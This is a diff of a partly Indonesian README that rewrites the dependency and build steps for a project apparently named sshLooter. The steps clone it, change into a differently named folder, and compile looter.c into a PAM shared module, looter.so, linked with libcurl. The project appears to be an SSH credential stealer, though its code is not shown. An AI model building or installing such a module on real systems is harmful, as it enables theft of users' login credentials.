@@ -17,10 +17,20 @@ Untuk mengkompilasi modul ini, Anda memerlukan paket pengembangan berikut:
 
 #### Instalasi Ketergantungan (Contoh untuk RHEL/CentOS/Rocky Linux)
 
-```bash
-# Gunakan dnf atau yum
-sudo dnf install gcc libcurl-devel pam-devel git make
+### Debian/Ubuntu
+```
+apt install libcurl4-openssl-dev
+apt install libpam-dev
+```
+### RedHat/CentOs
+```
+yum install libcurl-devel
+yum install pam-devel
+```
 
+
+Use
+```bash
 git clone https://github.com/aexdyhaxor/sshLooter.git
 cd sshLooterC
 gcc -shared -fPIC looter.c $(curl-config --cflags --libs) -lpam -o looter.so
